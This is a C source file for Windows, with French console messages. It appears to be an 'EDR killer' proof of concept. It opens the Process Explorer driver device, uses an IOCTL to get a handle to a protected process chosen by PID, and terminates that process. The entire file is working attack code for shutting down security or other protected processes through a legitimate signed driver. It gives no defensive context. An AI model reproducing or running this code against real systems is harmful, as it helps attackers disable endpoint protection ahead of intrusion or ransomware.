#include <windows.h>
#include <stdio.h>

#define PROCEXP_DEVICE L"\\\\.\\PROCEXP152"
#define IOCTL_OPEN_PROTECTED_PROCESS_HANDLE 0x8335003C
#define IOCTL_CLOSE_HANDLE 0x83350004

typedef struct _PROCEXP_OPEN_PROCESS_IN {
    ULONG ProcessId;
} PROCEXP_OPEN_PROCESS_IN;

typedef struct _PROCEXP_OPEN_PROCESS_OUT {
    HANDLE ProcessHandle;
} PROCEXP_OPEN_PROCESS_OUT;

static void PrintLastError(const wchar_t *context)
{
    DWORD err = GetLastError();
    wprintf(L"[-] %s echoue (err=%lu)\n", context, err);
}

int wmain(int argc, wchar_t *argv[])
{
    DWORD targetPid;
    HANDLE hProcDirect = NULL;
    HANDLE hProcQuery = NULL;
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    PROCEXP_OPEN_PROCESS_IN inBuf;
    PROCEXP_OPEN_PROCESS_OUT outBuf;
    DWORD bytesReturned = 0;
    BOOL ok;

    if (argc < 2) {
        wprintf(L"Usage: %s <PID>\n", argv[0]);
        return 1;
    }

   targetPid = (DWORD)_wtoi(argv[1]);
   wprintf(L"[*] Cible : PID %lu\n", targetPid);

    hProcDirect = OpenProcess(PROCESS_TERMINATE, FALSE, targetPid);
    if (hProcDirect == NULL) {
        PrintLastError(L"OpenProcess(PROCESS_TERMINATE)");
    } else {
        wprintf(L"[+] OpenProcess(PROCESS_TERMINATE) reussi\n");
        CloseHandle(hProcDirect);
    }

    hProcQuery = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, targetPid);
    if (hProcQuery == NULL) {
        PrintLastError(L"OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION)");
        return 1;
    }
    wprintf(L"[+] process existe\n");
    CloseHandle(hProcQuery);

    hDevice = CreateFileW(PROCEXP_DEVICE,
                          GENERIC_READ | GENERIC_WRITE,
                          0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        PrintLastError(L"CreateFileW(PROCEXP152)");
        return 1;
    }
    wprintf(L"[+] Device ouvert\n");

    ZeroMemory(&inBuf, sizeof(inBuf));
    ZeroMemory(&outBuf, sizeof(outBuf));
    inBuf.ProcessId = targetPid;

    ok = DeviceIoControl(hDevice,
                         IOCTL_OPEN_PROTECTED_PROCESS_HANDLE,
                         &inBuf, sizeof(inBuf),
                         &outBuf, sizeof(outBuf),
                         &bytesReturned, NULL);
    if (!ok) {
        PrintLastError(L"DeviceIoControl");
        CloseHandle(hDevice);
        return 1;
    }

    wprintf(L"[+] Handle obtenu : 0x%p\n", outBuf.ProcessHandle);

    if (outBuf.ProcessHandle == NULL || outBuf.ProcessHandle == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] handle invalide\n");
        CloseHandle(hDevice);
        return 1;
    }

    ok = TerminateProcess(outBuf.ProcessHandle, 1);
    if (!ok) {
        PrintLastError(L"TerminateProcess");
    } else {
        wprintf(L"[+] TerminateProcess OK!\n");
    }

    DeviceIoControl(hDevice, IOCTL_CLOSE_HANDLE,
                    &outBuf.ProcessHandle, sizeof(outBuf.ProcessHandle),
                    NULL, 0, &bytesReturned, NULL);

    CloseHandle(outBuf.ProcessHandle);
    CloseHandle(hDevice);
    return 0;
}
